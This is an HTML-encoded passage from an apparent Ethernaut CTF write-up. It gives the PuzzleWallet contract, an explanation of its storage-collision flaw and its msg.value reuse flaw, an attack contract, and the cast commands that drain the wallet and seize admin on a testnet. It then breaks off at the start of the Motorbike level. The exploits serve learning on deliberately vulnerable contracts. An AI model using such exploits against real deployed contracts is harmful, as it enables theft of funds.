&lt;&#x2F;span&gt;&lt;span&gt;    mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; balances;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;_maxBalance) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;Already initialized&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _maxBalance;
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(whitelisted[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;], &amp;quot;Not whitelisted&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setMaxBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;_maxBalance) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;Contract balance is not 0&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _maxBalance;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;addToWhitelist&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;addr) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; owner, &amp;quot;Not the owner&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        whitelisted[addr] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span&gt; maxBalance, &amp;quot;Max balance reached&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; value, &amp;quot;Insufficient balance&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-=&lt;&#x2F;span&gt;&lt;span&gt; value;
&lt;&#x2F;span&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success, ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; to.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{ value: value }(data);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;Execution failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multicall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;calldata &lt;&#x2F;span&gt;&lt;span&gt;data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; depositCalled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        for (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt; _data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; data[i];
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes4 &lt;&#x2F;span&gt;&lt;span&gt;selector;
&lt;&#x2F;span&gt;&lt;span&gt;            assembly {
&lt;&#x2F;span&gt;&lt;span&gt;                selector := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;mload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(_data, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            if (selector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== this&lt;&#x2F;span&gt;&lt;span&gt;.deposit.selector) {
&lt;&#x2F;span&gt;&lt;span&gt;                require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt;depositCalled, &amp;quot;Deposit can only be called once&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Protect against reusing msg.value
&lt;&#x2F;span&gt;&lt;span&gt;                depositCalled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success, ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(data[i]);
&lt;&#x2F;span&gt;&lt;span&gt;            require(success, &amp;quot;Error while delegating call&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The two contracts use different memory layout, means that its able to use &lt;code&gt;pendingAdmin&lt;&#x2F;code&gt; to override puzzleWallet’s &lt;code&gt;owner&lt;&#x2F;code&gt;, then add us to whiteList to allow other methods to be used.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Call multicall inside another multicall, to bypass the restriction of selector, and get Balance more than we exactly deposited. (reuse &lt;code&gt;msg.value&lt;&#x2F;code&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Call &lt;code&gt;Execute&lt;&#x2F;code&gt; to run out the balance of the contract, and use &lt;code&gt;setMaxBalance&lt;&#x2F;code&gt; to override the memory of PuzzleProxy’s &lt;code&gt;admin&lt;&#x2F;code&gt; to finish this level.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    PuzzleWallet puzzleWallet;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_address) {
&lt;&#x2F;span&gt;&lt;span&gt;        puzzleWallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;PuzzleWallet&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;attack &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.001 ether&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;not enough&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; callsDeep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        callsDeep[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(PuzzleWallet.deposit.selector);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; calls &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        calls[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(PuzzleWallet.deposit.selector);
&lt;&#x2F;span&gt;&lt;span&gt;        calls[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(PuzzleWallet.multicall.selector, callsDeep);
&lt;&#x2F;span&gt;&lt;span&gt;        puzzleWallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multicall&lt;&#x2F;span&gt;&lt;span&gt;{value: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.001 ether&lt;&#x2F;span&gt;&lt;span&gt;}(calls);
&lt;&#x2F;span&gt;&lt;span&gt;        puzzleWallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&lt;&#x2F;span&gt;&lt;span&gt;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.002 ether&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        puzzleWallet.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setMaxBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;proposeNewAdmin(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PRVT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt; -- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;addToWhitelist(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PRVT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt; -- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;addToWhitelist(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PRVT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt; -- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;attack()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PRVT --value 1000000000000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;motorbike&quot;&gt;Motorbike&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.7.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-06&#x2F;utils&#x2F;Address.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-06&#x2F;proxy&#x2F;Initializable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Motorbike &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; keccak-256 hash of &amp;quot;eip1967.proxy.implementation&amp;quot; subtracted by 1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 internal constant&lt;&#x2F;span&gt;&lt;span&gt; _IMPLEMENTATION_SLOT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;AddressSlot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; value;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_logic) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(Address.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isContract&lt;&#x2F;span&gt;&lt;span&gt;(_logic), &amp;quot;ERC1967: new implementation is not a contract&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(_IMPLEMENTATION_SLOT).value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _logic;
